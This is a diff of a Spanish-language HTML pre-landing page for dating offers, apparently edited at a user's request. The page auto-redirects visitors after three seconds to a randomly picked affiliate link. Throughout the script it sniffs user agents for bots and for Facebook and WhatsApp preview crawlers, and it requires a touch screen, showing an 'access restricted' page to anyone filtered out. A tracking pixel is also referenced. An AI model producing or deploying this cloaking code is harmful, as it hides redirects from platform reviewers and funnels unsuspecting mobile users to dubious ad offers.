@@ -3,94 +3,55 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Acción Requerida</title>
+  <title>Redirigiendo...</title>
   <style>
     body {
       margin: 0;
       background-color: #000;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      color: white;
-      font-family: sans-serif;
     }
 
     img {
       max-width: 100%;
       height: auto;
-      margin-bottom: 20px;
-    }
-
-    .btn {
-      padding: 15px 30px;
-      font-size: 18px;
-      border: none;
-      border-radius: 8px;
-      background: #ff0055;
-      color: white;
-      cursor: pointer;
-      animation: pulse 1.5s infinite;
-    }
-
-    @keyframes pulse {
-      0% { box-shadow: 0 0 0 0 rgba(255,0,85,0.7); }
-      70% { box-shadow: 0 0 0 20px rgba(255,0,85,0); }
-      100% { box-shadow: 0 0 0 0 rgba(255,0,85,0); }
-    }
-
-    .hidden {
-      display: none;
     }
   </style>
 </head>
 <body>
 
-  <!-- Imagen principal -->
-  <img src="https://i.ibb.co/rGxdBzf5/An-example-of-a-pre-landing-page-for-Dating-offers.jpg?text=Haz+Click+Aquí" alt="Haz click aquí">
-
-  <!-- Botón de interacción -->
-  <button id="continueBtn" class="btn">Haz clic para continuar</button>
+  <!-- Imagen visible mientras se filtra tráfico -->
+  <img src="https://i.ibb.co/rGxdBzf5/An-example-of-a-pre-landing-page-for-Dating-offers.jpg?text=Haz+Click+Aquí" alt="Redireccionando...">
 
   <script>
+    // Lista de enlaces
     const links = [
-     "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
-            "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
-            "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
-            "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
-            "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global"
+      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
+      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
+      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
+      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
+      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global"
     ];
 
+    // Detectar bots comunes por User-Agent
     const isBot = /bot|crawl|slurp|spider|mediapartners|facebook|whatsapp|preview/i.test(navigator.userAgent);
+
+    // Verificar si es pantalla táctil (evita tráfico de escritorio emulado)
     const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
 
-    // Requiere scroll o clic humano
-    let humanActivity = false;
-
-    function markHuman() {
-      humanActivity = true;
-    }
-
-    window.addEventListener("scroll", markHuman);
-    window.addEventListener("mousemove", markHuman);
-    window.addEventListener("touchstart", markHuman);
-
-    document.getElementById("continueBtn").addEventListener("click", () => {
-      if (!isBot && hasTouch && humanActivity) {
+    // Esperar 3 segundos antes de redirigir (simula carga humana)
+    setTimeout(() => {
+      if (!isBot && hasTouch) {
         const randomLink = links[Math.floor(Math.random() * links.length)];
         window.location.href = randomLink;
       } else {
-        alert("Tráfico inválido o sin interacción humana. Intenta de nuevo.");
+        console.log("Tráfico bloqueado por sospecha de bot.");
+        // Puedes redirigir a una página de salida o quedarte aquí
+        document.body.innerHTML = "<h1 style='color: white; text-align:center;'>Acceso restringido</h1>";
       }
-    });
-
-    // Después de 10 segundos, si no hubo actividad humana, bloquea acción
-    setTimeout(() => {
-      if (!humanActivity) {
-        document.body.innerHTML = "<h1 style='color:white;text-align:center;'>Acceso bloqueado<br><br>Se requiere interacción humana.</h1>";
-      }
-    }, 10000);
+    }, 3000);
   </script>
 
   <!-- Pixel invisible -->
@@ -100,4 +61,4 @@
     </center>
   </div>
 </body>
-</html>
+</html> hasme todo lo que recomendaste en este html
